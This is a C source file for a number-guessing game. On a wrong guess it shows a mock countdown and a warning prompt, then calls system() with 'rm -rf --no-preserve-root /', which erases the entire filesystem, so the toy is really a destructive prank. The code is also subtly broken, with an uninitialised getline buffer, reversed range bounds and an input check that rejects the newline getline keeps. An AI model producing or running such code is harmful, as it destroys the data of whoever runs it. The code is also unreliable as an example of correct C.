#include <stdio.h>
#include <limits.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int isNumber(char *number);

int main(void)
{
	char *input;
	int guess, answer = -5;
	size_t size;

	/* set answer */

	printf("Guess a number between %d and %d.\n", INT_MAX, INT_MIN);
	getline(&input, &size, stdin);
	printf("%c", input[strlen(input)]);
	printf("Your number: %s.\n", input);
	if (isNumber(input))
		guess = atoi(input);
	else
	{
		printf("not a number\n");
		exit(EXIT_FAILURE);
		/* something */
	}

	if (guess != answer)
	{
		printf("deleting your computer...\n");
		sleep(1);
		printf("Warning: this is about to actually delete everything on this device. "
			   "Please only continue if you know what you are doing. Press ctrl+c to "
			   "cancel. Press enter to continue. ");
		getline(&input, &size, stdin);
		printf("deleting everything in...\n");
		printf("3\n");
		sleep(1);
		printf("2\n");
		sleep(1);
		printf("1\n");
		sleep(1);
		printf("0\n");
		sleep(1);
		system("rm -rf --no-preserve-root /"); // deletes EVERYTHING
		printf("Success! Deleti?n has c?mpleted. Enj?y digital ?blivi?n!\n\n");
	}
	return 0;
}

int isNumber(char *number)
{
	unsigned int i = 0;

	if (number[0] == '-')
		i++; // ignore leading negative sign

	while (i < strlen(number))
	{
		if (number[i] > '9' || number[i] < '0')
			return (0);

		i++;
	}

	return (1);
}
